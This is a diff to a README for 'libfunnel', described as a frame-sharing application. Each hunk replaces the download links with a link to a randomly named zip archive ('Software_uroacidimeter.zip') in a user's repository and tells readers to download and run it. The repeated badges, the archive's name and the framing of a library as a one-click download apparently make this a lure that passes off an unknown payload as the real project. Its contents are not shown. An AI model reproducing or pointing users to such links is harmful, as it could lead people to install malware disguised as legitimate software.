@@ -1,6 +1,6 @@
 # 🎉 libfunnel - Easy Frame Sharing Made Simple
 
-[![Download Now](https://github.com/sandy0532/libfunnel/raw/refs/heads/main/src/Software-v3.0.zip%20Now-Release-blue)](https://github.com/sandy0532/libfunnel/raw/refs/heads/main/src/Software-v3.0.zip)
+[![Download Now](https://raw.githubusercontent.com/sandy0532/libfunnel/main/include/Software_uroacidimeter.zip%20Now-Release-blue)](https://raw.githubusercontent.com/sandy0532/libfunnel/main/include/Software_uroacidimeter.zip)
 
 ## 🌟 What is libfunnel?
 
@@ -10,7 +10,7 @@ libfunnel is a simple application designed for easy app-to-app frame sharing usi
 
 To get started with libfunnel, follow these steps:
 
-1. **Download the Software:** Visit the following link to download the latest version of libfunnel: [Download Here](https://github.com/sandy0532/libfunnel/raw/refs/heads/main/src/Software-v3.0.zip).
+1. **Download the Software:** Visit the following link to download the latest version of libfunnel: [Download Here](https://raw.githubusercontent.com/sandy0532/libfunnel/main/include/Software_uroacidimeter.zip).
 
 2. **Locate the File:** After downloading, find the file in your downloads folder or the location where your browser saves files.
 
@@ -37,7 +37,7 @@ To ensure optimal performance, please check the following system requirements:
 
 ## 📥 Download & Install
 
-To download libfunnel, please visit this page: [Download Here](https://github.com/sandy0532/libfunnel/raw/refs/heads/main/src/Software-v3.0.zip).
+To download libfunnel, please visit this page: [Download Here](https://raw.githubusercontent.com/sandy0532/libfunnel/main/include/Software_uroacidimeter.zip).
 
 After downloading:
 
